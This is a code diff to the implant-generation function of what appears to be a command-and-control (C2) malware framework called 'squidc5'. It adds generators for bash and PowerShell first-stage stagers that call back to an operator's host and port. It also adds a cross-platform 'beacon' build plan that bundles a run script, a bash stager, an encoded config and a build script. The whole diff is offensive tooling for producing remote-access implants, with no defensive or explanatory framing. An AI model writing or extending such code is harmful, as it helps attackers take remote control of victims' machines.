@@ -399,7 +399,31 @@ def generate_implant(
     elif family == "linux_stager":
         if platform != "linux":
             raise ValueError("linux_stager is linux-only")
-        content = generate_linux_stager(host, port, path)
+        from squidc5.implants.factory import generate_stage0_bash
+
+        sch = "https" if str(scheme or "").lower() in ("https", "wss") else "http"
+        content = generate_stage0_bash(host=host, port=port, scheme=sch, channel="http")
+    elif family in ("windows_stager", "stage0_ps1"):
+        if platform != "windows":
+            raise ValueError("windows_stager is windows-only")
+        from squidc5.implants.factory import generate_stage0_ps1
+
+        sch = "https" if str(scheme or "").lower() in ("https", "wss") else "http"
+        content = generate_stage0_ps1(host=host, port=port, scheme=sch)
+    elif family == "native_sc5beacon":
+        from squidc5.implants.factory import build_plan
+
+        arch_map = {"x64": "amd64", "x86": "386", "arm64": "arm64", "amd64": "amd64", "386": "386"}
+        a = arch_map.get(arch, arch)
+        plat = "darwin" if platform == "macos" else platform
+        sch = "https" if str(scheme or "").lower() in ("https", "wss", "") else "http"
+        if str(scheme or "").lower() in ("http", "ws"):
+            sch = "http"
+        plan = build_plan(os_name=plat, arch=a, host=host, port=port, path=path, scheme=sch)
+        content = plan["run_script"] + "\n# --- stage0 bash ---\n" + plan["stager_bash"]
+        meta["config_blob_b64"] = plan.get("config_blob_b64")
+        meta["build_script"] = plan.get("build_script")
+
     elif family == "linux_memfd":
         if platform != "linux":
             raise ValueError("linux_memfd is linux-only")
